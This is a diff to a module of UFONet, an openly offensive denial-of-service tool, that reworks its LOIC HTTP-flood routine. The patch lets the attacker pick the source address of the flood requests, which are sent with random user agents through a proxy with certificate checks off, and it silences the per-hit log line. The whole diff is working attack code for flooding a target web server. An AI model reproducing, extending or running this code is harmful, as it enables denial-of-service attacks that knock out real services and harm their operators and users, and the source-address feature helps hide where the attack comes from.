@@ -20,7 +20,7 @@ except:
     sys.exit(2)
 
 # UFONet DoS Web LOIC (Low Orbit Ion Cannon)
-def ionize(self, target, rounds, proxy, source = None):
+def ionize(self, target, rounds, proxy, address_dict):
     n=0
     try:
         proxyD = { 
@@ -31,16 +31,16 @@ def ionize(self, target, rounds, proxy, source = None):
             self.user_agent = random.choice(self.agents).strip()
             headers = {'User-Agent': str(self.user_agent)}
 
-            if source is not None: # Allow different source for sending request
+            if address_dict['source'] is not None: # Allow different source for sending request
                 from requests_toolbelt.adapters import source
                 s = requests.Session()
-                new_source = source.SourceAddressAdapter(source)
+                new_source = source.SourceAddressAdapter(address_dict['source'])
                 s.mount("http://", new_source)
                 s.mount("https://", new_source)
 
             try:
                 r = requests.get(target, headers=headers, proxies=proxyD, verify=False)
-                print("[Info] [AI] [LOIC] Firing 'pulse' ["+str(n)+"] -> [HIT!]")
+                # print("[Info] [AI] [LOIC] Firing 'pulse' ["+str(n)+"] -> [HIT!]")
             except:
                 print("[Error] [AI] LOIC: Failed to engage with 'pulse' ["+str(n)+"]")
     except:
@@ -56,6 +56,6 @@ class LOIC(object):
         for agent in agents:
             self.agents.append(agent)
 
-    def attacking(self, target, rounds, proxy, source=None):
+    def attacking(self, target, rounds, proxy, address_dict):
         print("[Info] [AI] Low Orbit Ion Cannon (LOIC) is ready to fire: [" , rounds, "pulses ]")
-        ionize(self, target, rounds, proxy, source) # attack with LOIC using threading
+        ionize(self, target, rounds, proxy, address_dict) # attack with LOIC using threading
